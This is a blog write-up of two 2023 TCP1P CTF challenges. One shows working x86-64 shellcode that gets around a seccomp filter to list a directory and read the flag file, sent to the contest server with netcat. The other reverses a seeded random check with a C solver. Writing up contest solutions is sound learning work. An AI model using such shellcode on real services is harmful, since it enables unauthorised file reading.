---
layout: post
title:  "TCP1P CTF Writeups"
date:   2023-10-15 23:03:20 +0200
categories: blog security ctf
---

This weekend, some friends and I have taken part in a [CTF](https://dev.to/atan/what-is-ctf-and-how-to-get-started-3f04){:target="_blank"}. Despite not giving it our full attention because of school and other stuff, we managed to solve a couple of the easier challenges.

Incidentally, this was also the first CTF I joined as part of a team and the first time I could share my knowledge and my methods with others, which is commonly done through the medium known as "write-ups". A write-up is essentially nothing more than an explanation of how a challenge was (or could be) successfully solved by a participant, allowing contestants who were not successful in solving the task to learn something new and expand their arsenal of hacking skills.

Although the challenges I solved were not hard and there will likely be many more (potentially better or more detailed) write-ups, I decided I might as well share them anyways, so if you're interested, keep reading.

The CTF in question was the [2023 TCP1P CTF](https://ctf.tcp1p.com/){:target="_blank"}, the challenges (or as TCP1P calls them, *games*) I solved were `Subject Encallment` in the Reverse Engineering category, `Bluffer Overflow` and `message` in the PWN category and `zipzipzip` and `Guess My Number` in the Misc category. I have not written a write-up for Subject Encallment and Bluffer Overflow, since I have demonstrated the exploitation in person during the CTF (the former is a really simple ELF reverse engineering task, the latter is an almost foolproof buffer overflow exploitation challenge), and I will also not include a write-up for zipzipzip, since it is frankly quite trivial.

**Alright, let's get into it!**

# Table of contents

- [Message](#message)
- [Guess My Number](#guess-my-number)

# Message

We are given an IP with a port (`nc ctf.tcp1p.com 8008`) and a binary file named `chall`.

Connecting to the given service with netcat as suggested, we are presented with a question: "Anything you want to tell me?"... Quickly you will find out that entering any textual input will crash the program with either a Segmentation Fault or an Illegal Instruction.

Looking at the binary file with the `file` command, we find out that it's a 64-bit ELF executable, and running it in a safe environment produces the same behaviour as the remote service, so it is safe to assume it's the same executable as the one running on the server.

## Solution

Since we're not given any source files, let's look at the disassembly of the `main` function using `objdump -d -Mintel ./chall` and analyze its behaviour:

```s
00000000000013b7 <main>:
    # unimportant, function prologue
    13b7:	f3 0f 1e fa          	endbr64
    13bb:	55                   	push   rbp
    13bc:	48 89 e5             	mov    rbp,rsp
    13bf:	48 83 ec 10          	sub    rsp,0x10

    # var_10 = malloc(0x150);
    13c3:	bf 50 01 00 00       	mov    edi,0x150
    13c8:	e8 b3 fd ff ff       	call   1180 <malloc@plt>
    13cd:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax

    # var_8 = mmap(NULL, 0x1000, READ | WRITE | EXEC, ...);
    13d1:	41 b9 00 00 00 00    	mov    r9d,0x0
    13d7:	41 b8 ff ff ff ff    	mov    r8d,0xffffffff
    13dd:	b9 22 00 00 00       	mov    ecx,0x22
    13e2:	ba 07 00 00 00       	mov    edx,0x7
    13e7:	be 00 10 00 00       	mov    esi,0x1000
    13ec:	bf 00 00 00 00       	mov    edi,0x0
    13f1:	e8 5a fd ff ff       	call   1150 <mmap@plt>
    13f6:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax

    # setup();
    13fa:	b8 00 00 00 00       	mov    eax,0x0
    13ff:	e8 a5 fe ff ff       	call   12a9 <setup>
    
    # seccomp_setup();
    1404:	b8 00 00 00 00       	mov    eax,0x0
    1409:	e8 00 ff ff ff       	call   130e <seccomp_setup>

    # if (var_8 == -1 || var_10 == 0)
    140e:	48 83 7d f8 ff       	cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
    1413:	74 07                	je     141c <main+0x65>
    1415:	48 83 7d f0 00       	cmp    QWORD PTR [rbp-0x10],0x0
    141a:	75 16                	jne    1432 <main+0x7b>
    
    # perror(...); return 1;
    141c:	48 8d 05 e5 0b 00 00 	lea    rax,[rip+0xbe5]
    1423:	48 89 c7             	mov    rdi,rax
    1426:	e8 85 fd ff ff       	call   11b0 <perror@plt>
    142b:	b8 01 00 00 00       	mov    eax,0x1
    1430:	eb 6a                	jmp    149c <main+0xe5>

    # else
    # puts(...);
    1432:	48 8d 05 e7 0b 00 00 	lea    rax,[rip+0xbe7]
    1439:	48 89 c7             	mov    rdi,rax
    143c:	e8 ef fc ff ff       	call   1130 <puts@plt>

    # read(stdin, var_10, 0x150);
    1441:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
    1445:	ba 50 01 00 00       	mov    edx,0x150
    144a:	48 89 c6             	mov    rsi,rax
    144d:	bf 00 00 00 00       	mov    edi,0x0
    1452:	e8 09 fd ff ff       	call   1160 <read@plt>

    # memcpy(var_8, var_10, 0x1000);
    1457:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
    145b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    145f:	ba 00 10 00 00       	mov    edx,0x1000
    1464:	48 89 ce             	mov    rsi,rcx
    1467:	48 89 c7             	mov    rdi,rax
    146a:	e8 01 fd ff ff       	call   1170 <memcpy@plt>

    # ((void (*)(void))var_8)();
    146f:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    1473:	b8 00 00 00 00       	mov    eax,0x0
    1478:	ff d2                	call   rdx

    # cleanup & return
    147a:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
    147e:	48 89 c7             	mov    rdi,rax
    1481:	e8 7a fc ff ff       	call   1100 <free@plt>
    1486:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    148a:	be 00 10 00 00       	mov    esi,0x1000
    148f:	48 89 c7             	mov    rdi,rax
    1492:	e8 f9 fc ff ff       	call   1190 <munmap@plt>
    1497:	b8 00 00 00 00       	mov    eax,0x0
    149c:	c9                   	leave
    149d:	c3                   	ret
```

In simple terms, the program reads from the standard input, copies the input into an allocated page with execute permissions, calls `setup()` and `seccomp_setup()` and then **calls the copied input bytes as if they were a function**. That explains (or confirms) the suspicious behaviour when text was supplied as input.

At a quick glance, `setup` looks like the same function that was used in the `Bluffer Overflow` challenge and isn't important for the attacker. The only remaining part of the puzzle is the `seccomp_setup()` call. **What is seccomp?**

> seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a "secure" state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. (*Wikipedia, 2023/10/14*)

Looking inside the seccomp_setup function, we see that several calls to `seccomp_add_rule` are being made, after an initial call to `seccomp_init` and before finally calling `seccomp_load`.

I tried understanding these calls just from the code, but it turned out to be much easier to use [an existing tool](https://github.com/david942j/seccomp-tools) for the task (many thanks to the author).

Running `seccomp-tools dump ./chall` gave the following output:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

which can be interpreted as saying (roughly) "*only allow these system calls: read, write, open, getdents64*".

Now it was time to write some shellcode to execute on the remote server. Eventually, we want to be able to read the flag, which we assume is in a file somewhere on the server, but we don't know the name of that file, or its location. Therefore, we start by listing the contents of the `/home/ctf` directory (we know this directory is where the program is located thanks to the error output from the server). This can be done with the getdents64 (get directory entries 64) syscall.

Here is the exploit I wrote:
```s
.intel_syntax noprefix
    # prologue, not strictly necessary, but allows you to use the rbp register to access local vars
    # (for this part I simply modified code generated by gcc from a C source file)
    push rbp
    mov rbp, rsp
    sub rsp, 0x10020

    # write the string '/home/ctf',0 somewhere on the stack
    mov DWORD PTR [rsp],     0x6d6f682f
    mov DWORD PTR [rsp+0x4], 0x74632f65
    mov DWORD PTR [rsp+0x8], 0x66 # this will also write the terminating zero

    # call open with the appropriate flags
    xor edx, edx        # mode can be zero
    mov rsi, 65536      # O_DIRECTORY | O_RDONLY
    mov rdi, rsp        # const char *filename
    mov rax, 0x2        # open
    syscall

    # call getdents64 with the fd returned by open
    mov rdx, 0x10000    # cnt bytes
    # I decided to just write into stack memory, since we don't need it for anything else :P
    mov rsi, rsp        # buff *
    mov rdi, rax        # fd
    mov rax, 0xd9       # getdents64
    syscall

    # cnt is the number of bytes written, returned by getdents64
    mov QWORD PTR [rbp-0x18], rax  # cnt
    # ptr is an offset into the buffer pointing at the current linux_dent64 structure
    mov QWORD PTR [rbp-0x8], 0     # ptr
    jmp .cond

    # iterate through all linux_dent64 structures
.loop:
    lea    rdx,[rbp-0x10020]
    mov    rax,QWORD PTR [rbp-0x8]
    add    rax,rdx
    movzx  eax,WORD PTR [rax+0x10]
    movzx  eax,ax
    lea    rdx,[rax-0x14]
    lea    rcx,[rbp-0x10020]
    mov    rax,QWORD PTR [rbp-0x8]
    add    rax,rcx
    add    rax,0x13
    
    # write the name of the file to stdout
    mov rdx, rdx
    mov rsi, rax
    mov rdi, 1
    mov rax, 1
    syscall

    # write a newline to stdout
    mov DWORD PTR [rsp-4], 0x0a
    mov edx, 1
    lea rsi, [rsp-4]
    mov rdi, 1
    mov rax, 1
    syscall

    lea    rdx,[rbp-0x10020]
    mov    rax,QWORD PTR [rbp-0x8]
    add    rax,rdx
    movzx  eax,WORD PTR [rax+0x10]
    movzx  eax,ax
    add    QWORD PTR [rbp-0x8],rax

.cond:
    mov rax, QWORD PTR [rbp-0x18]
    cmp QWORD PTR [rbp-0x8], rax
    jb .loop

    nop
    nop
    leave
    ret
```

Assembling with `as exploit.asm`, extracting the bytes of the function itself into another file called `payload_ls` (I don't know about a good way of doing this, I used `xxd`) and running `./chall < payload_ls` successfully lists the contents of the `/home/ctf` directory (if it exists, we don't really care about error handling).

Sending the payload to the server (`cat payload_ls | nc ...`) returns the following:
```
Anything you want to tell me? 
.
..
flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt
run_challenge.sh
chall
bin
dev
/home/ctf/run_challenge.sh: line 2:  4869 Segmentation fault      ./chall
```

Now we know which file to read to obtain the flag. Let's write another exploit, this time reading the appropriate file.

```s
.intel_syntax noprefix

# Again, overwrite the stack with the file path
# (I generated these (text) instructions with a C program)

mov DWORD PTR [rsp+0x0], 0x6d6f682f
mov DWORD PTR [rsp+0x4], 0x74632f65
mov DWORD PTR [rsp+0x8], 0x6c662f66
mov DWORD PTR [rsp+0xc], 0x332d6761
mov DWORD PTR [rsp+0x10], 0x64323634
mov DWORD PTR [rsp+0x14], 0x38663130
mov DWORD PTR [rsp+0x18], 0x63623165
mov DWORD PTR [rsp+0x1c], 0x38643063
mov DWORD PTR [rsp+0x20], 0x63383133
mov DWORD PTR [rsp+0x24], 0x34636534
mov DWORD PTR [rsp+0x28], 0x64643032
mov DWORD PTR [rsp+0x2c], 0x61323834
mov DWORD PTR [rsp+0x30], 0x64623238
mov DWORD PTR [rsp+0x34], 0x35366238
mov DWORD PTR [rsp+0x38], 0x65316430
mov DWORD PTR [rsp+0x3c], 0x66623334
mov DWORD PTR [rsp+0x40], 0x37363463
mov DWORD PTR [rsp+0x44], 0x39666331
mov DWORD PTR [rsp+0x48], 0x65363538
mov DWORD PTR [rsp+0x4c], 0x2e303965
mov DWORD PTR [rsp+0x50], 0x747874

# open(filename, flags, mode)
xor edx, edx
xor esi, esi
mov rdi, rsp
mov rax, 2
syscall

# read(fd, buffer, count)
mov rdx, 0x100
mov rsi, rsp
mov rdi, rax
xor eax, eax
syscall

# write(stdout, buffer, count)
mov rdx, rax
mov rsi, rsp
mov rdi, 1
mov rax, 1
syscall

# you could also exit here, but ¯\_(ツ)_/¯
```

Again, running `cat payload_readflag | nc ...` prints
```
Anything you want to tell me? 
TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}/home/ctf/run_challenge.sh: line 2:  4875 Segmentation fault      ./chall
```

# Guess My Number

We are given an IP with a port (`nc ctf.tcp1p.com 7331`) and a zip with a 64-bit ELF executable file named `guess`.

The challenge asks us to guess a number and promises that if our guess is correct, it will reveal the flag. We could, of course, take a guess, but we don't know anything about the size of the number or if the challenge is even honest with us. To understand how the program processes the input and decides whether the guess is correct, we need to analyze (or reverse-engineer) it.

## Solution

Analyzing the main function using `objdump -d -Mintel ./guess` reveals three function calls: One to `flag_handler` (simply checks if the flag file is found, otherwise exits with an error), `banner` and `vuln`.

The `banner` function just prints this banner to the standard output:
```
=======              WELCOME TO GUESSING GAME               =======
======= IF YOU CAN GUESS MY NUMBER, I'LL GIVE YOU THE FLAG  =======
```

so the interesting part is probably going to be the `vuln` function. Let's look at it in detail:

```s
000000000000122b <vuln>:
    # function prologue
    122b:	55                   	push   rbp
    122c:	48 89 e5             	mov    rbp,rsp
    122f:	48 83 ec 10          	sub    rsp,0x10

    # Move zero into a global 32-bit variable named 'key'
    1233:	c7 05 27 2e 00 00 00 	mov    DWORD PTR [rip+0x2e27],0x0        # 4064 <key>
    123a:	00 00 00

    # Call srand with 0x539 as the argument - this effectively seeds
    # the pseudo-random number generator from the C standard library
    # with that value, so all 'random' number generation will be
    # deterministic (and replicable!)
    123d:	bf 39 05 00 00       	mov    edi,0x539
    1242:	e8 19 fe ff ff       	call   1060 <srand@plt>

    # Call rand() to get a random 32-bit number and store it in
    # the local var_4
    1247:	e8 64 fe ff ff       	call   10b0 <rand@plt>
    124c:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax

    # Load the string 'Your Guess : ' into rdi and call printf
    124f:	48 8d 05 67 0e 00 00 	lea    rax,[rip+0xe67]
    1256:	48 89 c7             	mov    rdi,rax
    1259:	b8 00 00 00 00       	mov    eax,0x0
    125e:	e8 ed fd ff ff       	call   1050 <printf@plt>

    # Because printf wasn't called with a newline-terminated string,
    # the programmer had to call fflush(stdout) to flush the buffer
    1263:	48 8b 05 ee 2d 00 00 	mov    rax,QWORD PTR [rip+0x2dee]        # 4058 <stdout@GLIBC_2.2.5>
    126a:	48 89 c7             	mov    rdi,rax
    126d:	e8 fe fd ff ff       	call   1070 <fflush@plt>

    # Read the number provided on the standard input and write it to
    # the global variable 'key' (the one that was zeroed earlier)
    1272:	48 8d 05 eb 2d 00 00 	lea    rax,[rip+0x2deb]        # 4064 <key>
    1279:	48 89 c6             	mov    rsi,rax
    127c:	48 8d 05 48 0e 00 00 	lea    rax,[rip+0xe48]         # "%d"
    1283:	48 89 c7             	mov    rdi,rax
    1286:	b8 00 00 00 00       	mov    eax,0x0
    128b:	e8 00 fe ff ff       	call   1090 <__isoc99_scanf@plt>

    # This is the important part:
    #
    # The 'random'-generated number in var_4 is moved into eax,
    # 0x1467f3 is added to it, and it is xored with the input number,
    # now stored in the 'key' global variable. The result is compared
    # to the constant 0xcafebabe.
    1290:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    1293:	8d 90 f3 67 14 00    	lea    edx,[rax+0x1467f3]
    1299:	8b 05 c5 2d 00 00    	mov    eax,DWORD PTR [rip+0x2dc5]        # 4064 <key>
    129f:	31 d0                	xor    eax,edx
    12a1:	3d be ba fe ca       	cmp    eax,0xcafebabe

    # If the result does not equal 0xcafebabe, jump to a fail branch.
    12a6:	75 28                	jne    fail # (12d0, but I wanted a descriptive label)

    # Otherwise, congratulate the user and print the flag by invoking
    # the system command 'cat flag.txt'.
    12a8:	48 8d 05 1f 0e 00 00 	lea    rax,[rip+0xe1f]        # "Correct! This is your flag :"
    12af:	48 89 c7             	mov    rdi,rax
    12b2:	e8 79 fd ff ff       	call   1030 <puts@plt>
    12b7:	48 8d 05 2d 0e 00 00 	lea    rax,[rip+0xe2d]        # "cat flag.txt"
    12be:	48 89 c7             	mov    rdi,rax
    12c1:	e8 7a fd ff ff       	call   1040 <system@plt>
    
    # Finally, call exit(0).
    12c6:	bf 00 00 00 00       	mov    edi,0x0
    12cb:	e8 d0 fd ff ff       	call   10a0 <exit@plt>

    fail:
    
    # Print a failure message and return to the main function.
    12d0:	48 8d 05 21 0e 00 00 	lea    rax,[rip+0xe21] # "Wrong, Try again harder!"
    12d7:	48 89 c7             	mov    rdi,rax
    12da:	e8 51 fd ff ff       	call   1030 <puts@plt>
    12df:	90                   	nop
    12e0:	c9                   	leave
    12e1:	c3                   	ret
```

Putting all the puzzle pieces together:

1. We know that whatever number we input, it will be xored with a deterministically generated number added to a constant.
2. We know that the result will be compared to the magic number `0xcafebabe`.

Therefore, our 'equation' looks like this:

```c
x ^ (rand(seed = 0x539) + 0x1467f3) = 0xcafebabe
```

We will take advantage of the fact that the `xor` operation is an [involution](https://en.m.wikipedia.org/wiki/Involution_(mathematics)){:target="_blank"} and apply `^ (rand(seed = 0x539) + 0x1467f3)` to both sides of the equation. That gives us

```c
x ^ (rand(seed = 0x539) + 0x1467f3) ^ (rand(seed = 0x539) + 0x1467f3) = 0xcafebabe ^ (rand(seed = 0x539) + 0x1467f3)
```
or equivalently
```c
x = 0xcafebabe ^ (rand(seed = 0x539) + 0x1467f3)
```

Now we just write a trivial C one-liner to compute this number for us:

```c
/* File: solve.c */
#include <stdio.h>
#include <stdlib.h>

int main() {
    srand(0x539), printf("%d\n", (rand() + 0x1467f3) ^ 0xcafebabe);
    return 0;
}
```

and compile the code using `gcc solve.c`.

The result turns out to be `-612639902`, but that's too complicated to type manually, so let's take advantage of unix pipes and just run `./a.out | nc ctf.tcp1p.com 7331`.

```
=======              WELCOME TO GUESSING GAME               =======
======= IF YOU CAN GUESS MY NUMBER, I'LL GIVE YOU THE FLAG  =======

Your Guess : TCP1P{r4nd0m_1s_n0t_th4t_r4nd0m_r19ht?_946f38f6ee18476e7a0bff1c1ed4b23b}
Correct! This is your flag :
```

